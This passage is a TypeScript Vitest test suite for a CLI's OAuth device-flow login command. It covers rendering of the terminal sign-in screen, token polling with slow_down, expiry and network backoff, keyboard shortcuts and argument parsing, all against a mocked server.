/**
 * `id.org.ai login` output (mock 4a, docs/product-update/spec/cli-output.md)
 * and the device-flow polling state machine (RFC 8628, spec B3).
 *
 * Every test mocks `fetch`: nothing here reaches a network, and the CLI's
 * default API base (production) is never contacted.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { EventEmitter } from 'node:events'
import { formatUserCode, deviceName, authorizeDevice, pollDeviceToken, pollForTokens, parseDeviceAuthorization } from '../src/sdk/cli/device'
import { renderLogin, outputMode, formatCountdown, SPINNER_FRAMES, SPINNER_INTERVAL_MS } from '../src/sdk/cli/login-output'
import type { LoginScreen, OutputMode } from '../src/sdk/cli/login-output'
import { runLogin, parseLoginArgs, EXIT } from '../src/sdk/cli/login'
import type { LoginOptions } from '../src/sdk/cli/login'
import { canOpenBrowser, copyToClipboard, openInBrowser } from '../src/sdk/cli/desktop'
import type { SpawnBrowser } from '../src/sdk/cli/desktop'
import { cleanText, parseUserCode, openableUrl, MAX_TEXT_LENGTH } from '../src/sdk/cli/untrusted'
import { getUser } from '../src/sdk/cli/auth'
import type { StoredTokenData, TokenStorage } from '../src/sdk/cli/storage'

// The confirm link is opened only on the API's own origin, and the API base is
// read once, at import. Pin it to the default so a developer's ID_ORG_AI_URL
// can't change what these tests see. fetch is mocked throughout: nothing is sent.
vi.hoisted(() => {
  delete process.env.ID_ORG_AI_URL
})

// ── Helpers ─────────────────────────────────────────────────────────────────

/** SGR codes made readable: {b} bold, {d} dim, {/} back to normal intensity. */
function tokens(s: string): string {
  return s.split('\x1b[1m').join('{b}').split('\x1b[2m').join('{d}').split('\x1b[22m').join('{/}')
}

const COLOUR_TTY: OutputMode = { colour: true, spinner: true, keys: true }
const PLAIN: OutputMode = { colour: false, spinner: false, keys: false }
const NO_COLOR_TTY: OutputMode = { colour: false, spinner: true, keys: true }

const AUTO_DEV = { name: 'auto.dev', cli: 'auto.dev' }
const ID_ORG_AI = { name: 'id.org.ai', cli: 'id.org.ai' }
const URL_4A = 'https://id.org.ai/device?code=WDJB-MJHT'

/** Mock 4a, line for line, as styled text. */
const MOCK_4A = [
  '',
  '{b}  auto.dev{/}{d}  ·  sign in with id.org.ai{/}',
  '',
  '{d}  Code     {/}{b}WDJB-MJHT{/}',
  '{d}  Confirm  {/}https://id.org.ai/device?code=WDJB-MJHT',
  '{d}           Opened in your browser.  {/}c{d} copy link   {/}o{d} open again{/}',
  '',
  '  ⠋ Waiting for you to confirm in the browser{d}  ·  expires in 29:52{/}',
  '',
  '  ✓ Signed in as Bryant Skarda {d}<bryant@driv.ly>{/}',
  '{d}    Workspace  {/}Drivly',
  '{d}    Stored in  {/}macOS Keychain · auto.dev',
  '{d}    Switch     {/}auto.dev login --account',
  '',
  '',
]

/** The same screen with no TTY: no styles, no spinner, no keys. */
const PLAIN_4A = [
  '',
  '  auto.dev  ·  sign in with id.org.ai',
  '',
  '  Code     WDJB-MJHT',
  '  Confirm  https://id.org.ai/device?code=WDJB-MJHT',
  '           Opened in your browser.',
  '',
  '  Waiting for you to confirm in the browser  ·  expires in 30:00',
  '',
  '  ✓ Signed in as Bryant Skarda <bryant@driv.ly>',
  '    Workspace  Drivly',
  '    Stored in  macOS Keychain · auto.dev',
  '    Switch     auto.dev login --account',
  '',
  '',
]

function screen(overrides: Partial<LoginScreen> = {}): LoginScreen {
  return {
    app: AUTO_DEV,
    code: 'WDJB-MJHT',
    url: URL_4A,
    browser: { opened: true },
    waiting: { frame: 0, remainingMs: 1_792_000 },
    outcome: {
      kind: 'success',
      name: 'Bryant Skarda',
      email: 'bryant@driv.ly',
      workspace: 'Drivly',
      storedIn: 'macOS Keychain · auto.dev',
    },
    ...overrides,
  }
}

/**
 * Just enough of a VT100 to replay what runLogin writes: text, CR, LF, erase
 * line, cursor up/down and cursor show/hide. SGR codes stay in the text so the
 * screen can be compared with styles. It refuses to overwrite a line it was not
 * told to erase, which is the redraw discipline the CLI must keep.
 */
class FakeTerminal {
  isTTY: boolean
  columns = 120
  rows: string[] = ['']
  row = 0
  atLineStart = true
  cursorVisible = true
  raw = ''

  constructor(isTTY = true) {
    this.isTTY = isTTY
  }

  write(chunk: string): boolean {
    this.raw += chunk
    const re = /\x1b\[\?25([hl])|\x1b\[(\d*)([ABK])|\r|\n|\x1b\[[0-9;]*m|[^\x1b\r\n]+/g
    for (const m of chunk.matchAll(re)) {
      const token = m[0]
      if (m[1]) {
        this.cursorVisible = m[1] === 'h'
      } else if (m[3] === 'A') {
        this.row -= Number(m[2] || 1)
        if (this.row < 0) throw new Error('cursor moved above the output')
        this.atLineStart = false
      } else if (m[3] === 'B') {
        this.row += Number(m[2] || 1)
        if (this.row >= this.rows.length) throw new Error('cursor moved below the output')
        this.atLineStart = false
      } else if (m[3] === 'K') {
        if (!this.atLineStart) throw new Error('erased a line without a carriage return first')
        this.rows[this.row] = ''
      } else if (token === '\r') {
        this.atLineStart = true
      } else if (token === '\n') {
        this.row += 1
        if (this.row === this.rows.length) this.rows.push('')
        this.atLineStart = true
      } else {
        if (this.atLineStart && this.rows[this.row] !== '') throw new Error(`overwrote line ${this.row} without erasing it`)
        this.rows[this.row] += token
        this.atLineStart = false
      }
    }
    return true
  }

  /** The screen, one entry per line, styles as {b} {d} {/}. */
  lines(): string[] {
    return this.rows.map(tokens)
  }

  line(n: number): string {
    return tokens(this.rows[n] ?? '')
  }
}

/** A terminal keyboard: raw-mode switch plus key presses. */
class FakeKeys extends EventEmitter {
  isTTY: boolean
  rawModes: boolean[] = []
  flowing = false

  constructor(isTTY = true) {
    super()
    this.isTTY = isTTY
  }

  setRawMode(mode: boolean) {
    this.rawModes.push(mode)
    return this
  }

  setEncoding() {
    return this
  }

  resume() {
    this.flowing = true
    return this
  }

  pause() {
    this.flowing = false
    return this
  }

  press(key: string) {
    this.emit('data', key)
  }
}

function memoryStorage(): TokenStorage & { saved: StoredTokenData | null } {
  const store = {
    saved: null as StoredTokenData | null,
    async getToken() {
      return store.saved?.accessToken ?? null
    },
    async setToken(token: string) {
      store.saved = { accessToken: token }
    },
    async removeToken() {
      store.saved = null
    },
    async getTokenData() {
      return store.saved
    },
    async setTokenData(data: StoredTokenData) {
      store.saved = data
    },
  }
  return store
}

interface Reply {
  status: number
  body: unknown
  /** A body sent as is instead of `body`, e.g. one that isn't JSON. */
  raw?: string
}
/**
 * A plain response object rather than undici's Response: its body streams could
 * schedule work on timers, which are fake here. With `raw`, json() parses it as
 * undici would, so a bad body throws V8's SyntaxError, which quotes the body.
 */
const json = (status: number, body: unknown, raw?: string) =>
  ({
    ok: status >= 200 && status < 300,
    status,
    json: async () => (raw === undefined ? body : JSON.parse(raw)),
    text: async () => raw ?? JSON.stringify(body),
  }) as unknown as Response
const pending = (): Reply => ({ status: 400, body: { error: 'authorization_pending' } })
const slowDown = (): Reply => ({ status: 400, body: { error: 'slow_down' } })
const denied = (): Reply => ({ status: 400, body: { error: 'access_denied' } })
const expiredToken = (): Reply => ({ status: 400, body: { error: 'expired_token' } })
const approved = (): Reply => ({ status: 200, body: { access_token: 'at_test', refresh_token: 'rt_test', token_type: 'Bearer', expires_in: 3600 } })

const DEVICE_REPLY = {
  device_code: 'dc_test',
  user_code: 'WDJBMJHT', // today's server sends no hyphen; the CLI shows one
  verification_uri: 'https://id.org.ai/device',
  verification_uri_complete: URL_4A,
  expires_in: 1800,
  interval: 4,
}

const USERINFO = { sub: 'user_1', name: 'Bryant Skarda', email: 'bryant@driv.ly', org_id: 'org_1', org_name: 'Drivly' }

interface FakeServer {
  fetch: ReturnType<typeof vi.fn>
  calls: Array<{ url: string; body: URLSearchParams }>
  tokenCalls(): number
}

/**
 * A fake id.org.ai: /oauth/device, /oauth/token (replies in order; 'network'
 * throws like a dropped connection) and /oauth/userinfo. Anything else throws.
 */
function fakeServer(tokenReplies: Array<Reply | 'network'>, options: { device?: Partial<typeof DEVICE_REPLY> | Reply; userinfo?: unknown } = {}): FakeServer {
  const calls: FakeServer['calls'] = []
  const replies = [...tokenReplies]
  const fetchMock = vi.fn(async (input: unknown, init?: RequestInit) => {
    const url = String(input)
    const body = new URLSearchParams(typeof init?.body === 'string' ? init.body : '')
    calls.push({ url, body })
    const path = new URL(url).pathname
    if (path === '/oauth/device') {
      const device = options.device
      if (device && 'status' in device && 'body' in device) return json(device.status as number, device.body, (device as Reply).raw)
      return json(200, { ...DEVICE_REPLY, ...(device as object) })
    }
    if (path === '/oauth/token') {
      const reply = replies.shift()
      if (!reply) throw new Error('no token reply left')
      if (reply === 'network') throw new TypeError('fetch failed')
      return json(reply.status, reply.body, reply.raw)
    }
    if (path === '/oauth/userinfo') return json(200, options.userinfo ?? USERINFO)
    throw new Error(`unexpected fetch: ${url}`)
  })
  vi.stubGlobal('fetch', fetchMock)
  return {
    fetch: fetchMock,
    calls,
    tokenCalls: () => calls.filter((c) => c.url.endsWith('/oauth/token')).length,
  }
}

function loginOptions(overrides: Partial<LoginOptions> & { term?: FakeTerminal; keys?: FakeKeys; env?: Record<string, string | undefined> } = {}) {
  const term = overrides.term ?? new FakeTerminal(true)
  const keys = overrides.keys ?? new FakeKeys(term.isTTY)
  const storage = memoryStorage()
  const openUrl = vi.fn(async (_url: string) => true)
  const copyText = vi.fn(async (_text: string) => true)
  const options: LoginOptions = {
    clientId: 'auto_dev_cli',
    app: AUTO_DEV,
    storage,
    storageLabel: 'macOS Keychain · auto.dev',
    deviceName: 'macOS · bryants-mbp',
    io: { stdout: term, stdin: keys, env: overrides.env ?? {}, openUrl, copyText },
    ...overrides,
  }
  return { options, term, keys, storage, openUrl, copyText }
}

beforeEach(() => {
  vi.useFakeTimers({ now: new Date('2026-10-02T12:00:00Z') })
})

afterEach(() => {
  vi.useRealTimers()
  vi.unstubAllGlobals()
})

// ── Codes and device names ──────────────────────────────────────────────────

describe('formatUserCode', () => {
  it('hyphenates an 8-character code', () => {
    expect(formatUserCode('WDJBMJHT')).toBe('WDJB-MJHT')
  })

  it('keeps a hyphenated code, uppercased', () => {
    expect(formatUserCode('wdjb-mjht')).toBe('WDJB-MJHT')
  })

  it('accepts spaces in place of the hyphen', () => {
    expect(formatUserCode(' WDJB MJHT ')).toBe('WDJB-MJHT')
  })

  it('leaves a code of another length as sent', () => {
    expect(formatUserCode('ABC-123')).toBe('ABC-123')
  })
})

describe('deviceName', () => {
  it('names the OS and the short hostname', () => {
    expect(deviceName('darwin', 'bryants-mbp.local')).toBe('macOS · bryants-mbp')
  })

  it('maps Windows and Linux', () => {
    expect(deviceName('win32', 'DESKTOP-7Q2')).toBe('Windows · DESKTOP-7Q2')
    expect(deviceName('linux', 'build-01.example.com')).toBe('Linux · build-01')
  })

  it('is the OS alone without a hostname', () => {
    expect(deviceName('linux', '')).toBe('Linux')
  })
})

// ── Pure rendering ──────────────────────────────────────────────────────────

describe('formatCountdown', () => {
  it('is mm:ss, rounding up so it reads 00:00 only once expired', () => {
    expect(formatCountdown(1_800_000)).toBe('30:00')
    expect(formatCountdown(1_792_000)).toBe('29:52')
    expect(formatCountdown(1_791_001)).toBe('29:52')
    expect(formatCountdown(59_000)).toBe('00:59')
    expect(formatCountdown(0)).toBe('00:00')
    expect(formatCountdown(-5_000)).toBe('00:00')
    expect(formatCountdown(7_200_000)).toBe('120:00')
  })
})

describe('outputMode', () => {
  it('styles, spins and takes keys on a terminal', () => {
    expect(outputMode({ stdoutIsTTY: true, stdinIsTTY: true, env: {} })).toEqual(COLOUR_TTY)
  })

  it('drops only colour under NO_COLOR', () => {
    expect(outputMode({ stdoutIsTTY: true, stdinIsTTY: true, env: { NO_COLOR: '1' } })).toEqual(NO_COLOR_TTY)
  })

  it('ignores an empty NO_COLOR, as no-color.org says', () => {
    expect(outputMode({ stdoutIsTTY: true, stdinIsTTY: true, env: { NO_COLOR: '' } })).toEqual(COLOUR_TTY)
  })

  it('is plain when stdout is not a terminal', () => {
    expect(outputMode({ stdoutIsTTY: false, stdinIsTTY: true, env: {} })).toEqual(PLAIN)
  })

  it('spins but takes no keys when stdin is not a terminal', () => {
    expect(outputMode({ stdoutIsTTY: true, stdinIsTTY: false, env: {} })).toEqual({ colour: true, spinner: true, keys: false })
  })

  it('is plain on a dumb terminal', () => {
    expect(outputMode({ stdoutIsTTY: true, stdinIsTTY: true, env: { TERM: 'dumb' } })).toEqual(PLAIN)
  })
})

describe('renderLogin', () => {
  it('draws mock 4a on a colour terminal', () => {
    expect(tokens(renderLogin(screen(), COLOUR_TTY)).split('\n')).toEqual(MOCK_4A)
  })

  it('is plain text with no spinner or keys when not a terminal', () => {
    expect(renderLogin(screen({ waiting: { frame: 3, remainingMs: 1_800_000 } }), PLAIN).split('\n')).toEqual(PLAIN_4A)
  })

  it('keeps the spinner and keys but no styles under NO_COLOR', () => {
    const text = renderLogin(screen(), NO_COLOR_TTY)
    expect(text).not.toContain('\x1b[')
    expect(text.split('\n')).toEqual(MOCK_4A.map((line) => line.replace(/\{[bd/]\}/g, '')))
  })

  it('names the app once for the id.org.ai CLI', () => {
    const text = renderLogin(screen({ app: ID_ORG_AI, outcome: { kind: 'success', email: 'bryant@driv.ly', storedIn: '~/.id.org.ai/token' } }), PLAIN)
    expect(text.split('\n')).toEqual([
      '',
      '  id.org.ai  ·  sign in',
      '',
      '  Code     WDJB-MJHT',
      '  Confirm  https://id.org.ai/device?code=WDJB-MJHT',
      '           Opened in your browser.',
      '',
      '  Waiting for you to confirm in the browser  ·  expires in 29:52',
      '',
      '  ✓ Signed in as bryant@driv.ly',
      '    Stored in  ~/.id.org.ai/token',
      '    Switch     id.org.ai login --account',
      '',
      '',
    ])
  })

  it('stops at the waiting line while there is no outcome', () => {
    const lines = tokens(renderLogin(screen({ outcome: undefined }), COLOUR_TTY)).split('\n')
    expect(lines).toEqual([...MOCK_4A.slice(0, 8), ''])
  })

  it('shows the frame it is given', () => {
    const lines = renderLogin(screen({ outcome: undefined, waiting: { frame: 12, remainingMs: 1_799_000 } }), NO_COLOR_TTY).split('\n')
    expect(lines[7]).toBe('  ⠹ Waiting for you to confirm in the browser  ·  expires in 29:59')
    expect(SPINNER_FRAMES.join('')).toBe('⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏')
    expect(SPINNER_INTERVAL_MS).toBe(80)
  })

  it('denied', () => {
    const lines = renderLogin(screen({ outcome: { kind: 'denied' } }), PLAIN).split('\n')
    expect(lines.slice(8)).toEqual(['', '  ✗ Sign-in cancelled in the browser.', '', ''])
  })

  it('expired names the CLI to run again', () => {
    const lines = renderLogin(screen({ app: ID_ORG_AI, outcome: { kind: 'expired' } }), PLAIN).split('\n')
    expect(lines.slice(8)).toEqual(['', '  ✗ The code expired. Run id.org.ai login again.', '', ''])
  })

  it('an error says what failed', () => {
    const lines = renderLogin(screen({ outcome: { kind: 'error', message: 'Unknown client_id' } }), PLAIN).split('\n')
    expect(lines.slice(8)).toEqual(['', '  ✗ Sign-in failed: Unknown client_id', '', ''])
  })

  it('a name without an email has no brackets; nothing known is just "Signed in"', () => {
    const named = renderLogin(screen({ outcome: { kind: 'success', name: 'Bryant Skarda', storedIn: 'x' } }), PLAIN).split('\n')
    expect(named[9]).toBe('  ✓ Signed in as Bryant Skarda')
    const anon = renderLogin(screen({ outcome: { kind: 'success', storedIn: 'x' } }), PLAIN).split('\n')
    expect(anon[9]).toBe('  ✓ Signed in')
    expect(anon[10]).toBe('    Stored in  x')
  })

  it('says so when the browser did not open, and offers to open it', () => {
    const tty = tokens(renderLogin(screen({ browser: { opened: false }, outcome: undefined }), COLOUR_TTY)).split('\n')
    expect(tty[5]).toBe('{d}           Open this link in your browser.  {/}c{d} copy link   {/}o{d} open{/}')
    const plain = renderLogin(screen({ browser: { opened: false }, outcome: undefined }), PLAIN).split('\n')
    expect(plain[5]).toBe('           Open this link in your browser.')
  })

  it('confirms a copy, or says it could not', () => {
    const copied = tokens(renderLogin(screen({ browser: { opened: true, note: 'copied' }, outcome: undefined }), COLOUR_TTY)).split('\n')
    expect(copied[5]).toBe('{d}           Link copied.  {/}c{d} copy link   {/}o{d} open again{/}')
    const failed = renderLogin(screen({ browser: { opened: true, note: 'copy-failed' }, outcome: undefined }), NO_COLOR_TTY).split('\n')
    expect(failed[5]).toBe("           Couldn't copy the link.  c copy link   o open again")
  })
})

// ── Device authorization request ────────────────────────────────────────────

describe('authorizeDevice', () => {
  it('sends client_id, scope and device_name', async () => {
    const server = fakeServer([])
    await authorizeDevice('auto_dev_cli', undefined, { deviceName: 'macOS · bryants-mbp' })
    const { url, body } = server.calls[0]
    expect(new URL(url).pathname).toBe('/oauth/device')
    expect(body.get('client_id')).toBe('auto_dev_cli')
    expect(body.get('scope')).toBe('openid profile email')
    expect(body.get('device_name')).toBe('macOS · bryants-mbp')
  })

  it('leaves device_name out unless asked', async () => {
    const server = fakeServer([])
    await authorizeDevice('auto_dev_cli')
    expect(server.calls[0].body.has('device_name')).toBe(false)
  })
})

// ── Polling state machine ───────────────────────────────────────────────────

describe('pollDeviceToken', () => {
  it('waits the interval, adds 5 s on each slow_down, and returns the tokens', async () => {
    const server = fakeServer([pending(), slowDown(), pending(), slowDown(), approved()])
    const result = pollDeviceToken({ clientId: 'c', deviceCode: 'dc_test', interval: 5, expiresIn: 600 })

    await vi.advanceTimersByTimeAsync(4_999)
    expect(server.tokenCalls()).toBe(0)
    await vi.advanceTimersByTimeAsync(1) // t=5 s: pending
    expect(server.tokenCalls()).toBe(1)
    await vi.advanceTimersByTimeAsync(5_000) // t=10 s: slow_down, interval now 10 s
    expect(server.tokenCalls()).toBe(2)
    await vi.advanceTimersByTimeAsync(9_999)
    expect(server.tokenCalls()).toBe(2)
    await vi.advanceTimersByTimeAsync(1) // t=20 s: pending
    expect(server.tokenCalls()).toBe(3)
    await vi.advanceTimersByTimeAsync(10_000) // t=30 s: slow_down, interval now 15 s
    expect(server.tokenCalls()).toBe(4)
    await vi.advanceTimersByTimeAsync(14_999)
    expect(server.tokenCalls()).toBe(4)
    await vi.advanceTimersByTimeAsync(1) // t=45 s: approved

    await expect(result).resolves.toEqual({
      status: 'approved',
      tokens: { access_token: 'at_test', refresh_token: 'rt_test', token_type: 'Bearer', expires_in: 3600 },
    })
    const poll = server.calls.find((c) => c.url.endsWith('/oauth/token'))!
    expect(poll.body.get('grant_type')).toBe('urn:ietf:params:oauth:grant-type:device_code')
    expect(poll.body.get('device_code')).toBe('dc_test')
    expect(poll.body.get('client_id')).toBe('c')
  })

  it('polls every 5 s when the server names no usable interval', async () => {
    const server = fakeServer([pending(), approved()])
    const result = pollDeviceToken({ clientId: 'c', deviceCode: 'd', interval: Number.NaN, expiresIn: undefined })
    await vi.advanceTimersByTimeAsync(4_999)
    expect(server.tokenCalls()).toBe(0)
    await vi.advanceTimersByTimeAsync(5_001)
    await expect(result).resolves.toMatchObject({ status: 'approved' })
    expect(server.tokenCalls()).toBe(2)
  })

  it('access_denied ends as denied', async () => {
    fakeServer([pending(), denied()])
    const result = pollDeviceToken({ clientId: 'c', deviceCode: 'd', interval: 5, expiresIn: 600 })
    await vi.advanceTimersByTimeAsync(10_000)
    await expect(result).resolves.toEqual({ status: 'denied' })
  })

  it('expired_token ends as expired', async () => {
    fakeServer([expiredToken()])
    const result = pollDeviceToken({ clientId: 'c', deviceCode: 'd', interval: 5, expiresIn: 600 })
    await vi.advanceTimersByTimeAsync(5_000)
    await expect(result).resolves.toEqual({ status: 'expired' })
  })

  it('stops at expires_in without polling past it', async () => {
    const server = fakeServer([pending(), pending(), pending()])
    const result = pollDeviceToken({ clientId: 'c', deviceCode: 'd', interval: 4, expiresIn: 10 })
    await vi.advanceTimersByTimeAsync(10_000)
    await expect(result).resolves.toEqual({ status: 'expired' })
    expect(server.tokenCalls()).toBe(2) // t=4 s and t=8 s; the code is gone at t=10 s
  })

  it('backs off after a dropped connection, then carries on', async () => {
    const server = fakeServer(['network', approved()])
    const result = pollDeviceToken({ clientId: 'c', deviceCode: 'd', interval: 5, expiresIn: 600 })
    await vi.advanceTimersByTimeAsync(5_000)
    expect(server.tokenCalls()).toBe(1)
    await vi.advanceTimersByTimeAsync(9_999) // backoff: 2 × 5 s
    expect(server.tokenCalls()).toBe(1)
    await vi.advanceTimersByTimeAsync(1)
    await expect(result).resolves.toMatchObject({ status: 'approved' })
  })

  it('gives up after repeated dropped connections', async () => {
    fakeServer(['network', 'network', 'network', 'network', 'network', 'network'])
    const result = pollDeviceToken({ clientId: 'c', deviceCode: 'd', interval: 5, expiresIn: 1800 })
    await vi.advanceTimersByTimeAsync(600_000)
    await expect(result).resolves.toMatchObject({ status: 'error', error: 'network_error' })
  })

  it('any other error ends the poll with its description', async () => {
    fakeServer([{ status: 400, body: { error: 'invalid_grant', error_description: 'Invalid or expired device code' } }])
    const result = pollDeviceToken({ clientId: 'c', deviceCode: 'd', interval: 5, expiresIn: 600 })
    await vi.advanceTimersByTimeAsync(5_000)
    await expect(result).resolves.toEqual({ status: 'error', error: 'invalid_grant', description: 'Invalid or expired device code' })
  })

  it('stops when aborted', async () => {
    const server = fakeServer([pending(), pending()])
    const controller = new AbortController()
    const result = pollDeviceToken({ clientId: 'c', deviceCode: 'd', interval: 5, expiresIn: 600, signal: controller.signal })
    await vi.advanceTimersByTimeAsync(6_000)
    controller.abort()
    await expect(result).resolves.toEqual({ status: 'aborted' })
    await vi.advanceTimersByTimeAsync(60_000)
    expect(server.tokenCalls()).toBe(1)
  })

  it('pollForTokens keeps throwing on denial for existing callers', async () => {
    fakeServer([denied()])
    const result = pollForTokens('c', 'd', 5, 600)
    const assertion = expect(result).rejects.toThrow('Access denied by user')
    await vi.advanceTimersByTimeAsync(5_000)
    await assertion
  })
})

// ── The login command, end to end against a fake server ─────────────────────

describe('runLogin on a terminal', () => {
  it('ends on exactly mock 4a, confirmed 8 s in', async () => {
    const server = fakeServer([pending(), approved()])
    const { options, term, keys, storage, openUrl } = loginOptions()

    const done = runLogin(options)
    await vi.advanceTimersByTimeAsync(8_000) // polls at 4 s (pending) and 8 s (approved)
    await expect(done).resolves.toBe(EXIT.ok)

    expect(term.lines()).toEqual(MOCK_4A)
    expect(openUrl).toHaveBeenCalledWith(URL_4A)
    expect(keys.rawModes).toEqual([true, false])
    expect(keys.flowing).toBe(false)
    expect(term.cursorVisible).toBe(true)
    expect(storage.saved).toMatchObject({ accessToken: 'at_test', refreshToken: 'rt_test' })
    const device = server.calls.find((c) => c.url.endsWith('/oauth/device'))!
    expect(device.body.get('device_name')).toBe('macOS · bryants-mbp')
    expect(device.body.get('client_id')).toBe('auto_dev_cli')
  })

  it('animates the spinner every 80 ms and counts down', async () => {
    fakeServer([pending(), pending()])
    const { options, term } = loginOptions()
    void runLogin(options)
    await vi.advanceTimersByTimeAsync(0)
    expect(term.line(7)).toBe('  ⠋ Waiting for you to confirm in the browser{d}  ·  expires in 30:00{/}')
    expect(term.cursorVisible).toBe(false)
    await vi.advanceTimersByTimeAsync(80)
    expect(term.line(7)).toBe('  ⠙ Waiting for you to confirm in the browser{d}  ·  expires in 30:00{/}')
    await vi.advanceTimersByTimeAsync(960) // t=1.04 s: 13 frames, a second gone
    expect(term.line(7)).toBe('  ⠸ Waiting for you to confirm in the browser{d}  ·  expires in 29:59{/}')
  })

  it('c copies the link, o opens it again', async () => {
    fakeServer([pending(), pending(), pending()])
    const { options, term, keys, openUrl, copyText } = loginOptions()
    void runLogin(options)
    await vi.advanceTimersByTimeAsync(0)

    keys.press('c')
    await vi.advanceTimersByTimeAsync(1)
    expect(copyText).toHaveBeenCalledWith(URL_4A)
    expect(term.line(5)).toBe('{d}           Link copied.  {/}c{d} copy link   {/}o{d} open again{/}')

    keys.press('o')
    await vi.advanceTimersByTimeAsync(1)
    expect(openUrl).toHaveBeenCalledTimes(2)
    expect(openUrl).toHaveBeenLastCalledWith(URL_4A)
    expect(term.line(5)).toBe('{d}           Opened in your browser.  {/}c{d} copy link   {/}o{d} open again{/}')
    expect(term.line(7)).toMatch(/Waiting for you to confirm in the browser/)
  })

  it('keys do nothing once the wait is over', async () => {
    fakeServer([approved()])
    const { options, keys, copyText } = loginOptions()
    const done = runLogin(options)
    await vi.advanceTimersByTimeAsync(4_000)
    await done
    keys.press('c')
    await vi.advanceTimersByTimeAsync(1)
    expect(copyText).not.toHaveBeenCalled()
    expect(keys.listenerCount('data')).toBe(0)
  })

  it('Ctrl-C stops waiting, restores the terminal and exits 130', async () => {
    fakeServer([pending(), pending()])
    const { options, term, keys } = loginOptions()
    const done = runLogin(options)
    await vi.advanceTimersByTimeAsync(5_000)
    keys.press('\x03')
    await expect(done).resolves.toBe(EXIT.interrupted)
    expect(keys.rawModes).toEqual([true, false])
    expect(term.cursorVisible).toBe(true)
    expect(term.rows.at(-1)).toBe('')
  })

  it('an aborted signal (SIGINT without raw mode) does the same', async () => {
    fakeServer([pending(), pending()])
    const controller = new AbortController()
    const { options, term } = loginOptions({ keys: new FakeKeys(false) })
    const done = runLogin({ ...options, signal: controller.signal })
    await vi.advanceTimersByTimeAsync(5_000)
    controller.abort()
    await expect(done).resolves.toBe(EXIT.interrupted)
    expect(term.cursorVisible).toBe(true)
  })

  it('denied: the cancelled line and exit 1', async () => {
    fakeServer([pending(), denied()])
    const { options, term, storage } = loginOptions()
    const done = runLogin(options)
    await vi.advanceTimersByTimeAsync(8_000)
    await expect(done).resolves.toBe(EXIT.failed)
    expect(term.lines().slice(7)).toEqual([
      '  ⠋ Waiting for you to confirm in the browser{d}  ·  expires in 29:52{/}',
      '',
      '  ✗ Sign-in cancelled in the browser.',
      '',
      '',
    ])
    expect(storage.saved).toBeNull()
  })

  it('expired: the run-again line and exit 1', async () => {
    fakeServer([expiredToken()])
    const { options, term } = loginOptions({ app: ID_ORG_AI })
    const done = runLogin(options)
    await vi.advanceTimersByTimeAsync(4_000)
    await expect(done).resolves.toBe(EXIT.failed)
    expect(term.lines().slice(9)).toEqual(['  ✗ The code expired. Run id.org.ai login again.', '', ''])
  })

  it('runs out the clock: 00:00 and expired', async () => {
    fakeServer([pending(), pending(), pending()], { device: { expires_in: 10 } })
    const { options, term } = loginOptions()
    const done = runLogin(options)
    await vi.advanceTimersByTimeAsync(10_000) // polls at 4 s and 8 s; the code is gone at 10 s
    await expect(done).resolves.toBe(EXIT.failed)
    expect(term.line(7)).toBe('  ⠋ Waiting for you to confirm in the browser{d}  ·  expires in 00:00{/}')
    expect(term.line(9)).toBe('  ✗ The code expired. Run auto.dev login again.')
  })

  it('a reply with no expires_in counts down from 10:00, not NaN', async () => {
    fakeServer([pending()], { device: { expires_in: undefined } })
    const { options, term } = loginOptions()
    void runLogin(options)
    await vi.advanceTimersByTimeAsync(0)
    expect(term.line(7)).toBe('  ⠋ Waiting for you to confirm in the browser{d}  ·  expires in 10:00{/}')
  })

  it('without a browser it says to open the link, and o opens it', async () => {
    fakeServer([pending(), pending()])
    const { options, term, keys, openUrl } = loginOptions()
    openUrl.mockResolvedValueOnce(false)
    void runLogin(options)
    await vi.advanceTimersByTimeAsync(0)
    expect(term.line(5)).toBe('{d}           Open this link in your browser.  {/}c{d} copy link   {/}o{d} open{/}')
    keys.press('o')
    await vi.advanceTimersByTimeAsync(1)
    expect(openUrl).toHaveBeenCalledTimes(2)
    expect(term.line(5)).toBe('{d}           Opened in your browser.  {/}c{d} copy link   {/}o{d} open again{/}')
  })

  it('a failed start says why and exits 1', async () => {
    fakeServer([], { device: { status: 400, body: { error: 'invalid_client', error_description: 'Unknown client_id' } } })
    const { options, term, openUrl } = loginOptions()
    await expect(runLogin(options)).resolves.toBe(EXIT.failed)
    expect(term.lines()).toEqual(['', '{b}  auto.dev{/}{d}  ·  sign in with id.org.ai{/}', '', '  ✗ Sign-in failed: Unknown client_id', '', ''])
    expect(openUrl).not.toHaveBeenCalled()
  })

  it('NO_COLOR: no styles, still spins and takes keys', async () => {
    fakeServer([pending(), approved()])
    const { options, term, keys } = loginOptions({ env: { NO_COLOR: '1' } })
    const done = runLogin(options)
    await vi.advanceTimersByTimeAsync(8_000)
    await expect(done).resolves.toBe(EXIT.ok)
    expect(term.raw).not.toMatch(/\x1b\[[0-9;]*m/)
    expect(term.raw).toContain('⠙')
    expect(keys.rawModes).toEqual([true, false])
    expect(term.lines()).toEqual(MOCK_4A.map((line) => line.replace(/\{[bd/]\}/g, '')))
  })
})

describe('runLogin when not a terminal', () => {
  it('prints plain text once: no styles, spinner, keys or redraws', async () => {
    fakeServer([pending(), approved()])
    const term = new FakeTerminal(false)
    const keys = new FakeKeys(false)
    const { options } = loginOptions({ term, keys })
    const done = runLogin(options)
    await vi.advanceTimersByTimeAsync(8_000)
    await expect(done).resolves.toBe(EXIT.ok)

    expect(term.raw).toBe(PLAIN_4A.join('\n'))
    expect(keys.rawModes).toEqual([])
    expect(keys.listenerCount('data')).toBe(0)
  })
})

// ── Arguments ───────────────────────────────────────────────────────────────

describe('parseLoginArgs', () => {
  it('accepts no flags, --account and --debug', () => {
    expect(parseLoginArgs([])).toEqual({ ok: true, account: false })
    expect(parseLoginArgs(['--account'])).toEqual({ ok: true, account: true })
    expect(parseLoginArgs(['--debug'])).toEqual({ ok: true, account: false })
  })

  it('refuses anything else as a usage error', () => {
    expect(parseLoginArgs(['--nope'])).toEqual({ ok: false, error: 'Unknown option for login: --nope' })
    expect(parseLoginArgs(['bryant'])).toEqual({ ok: false, error: 'Unexpected argument for login: bryant' })
    expect(EXIT.usage).toBe(2)
  })
})

// ── Browser and clipboard ───────────────────────────────────────────────────

describe('canOpenBrowser', () => {
  it('opens on a desktop', () => {
    expect(canOpenBrowser({}, 'darwin')).toBe(true)
    expect(canOpenBrowser({}, 'win32')).toBe(true)
    expect(canOpenBrowser({ DISPLAY: ':0' }, 'linux')).toBe(true)
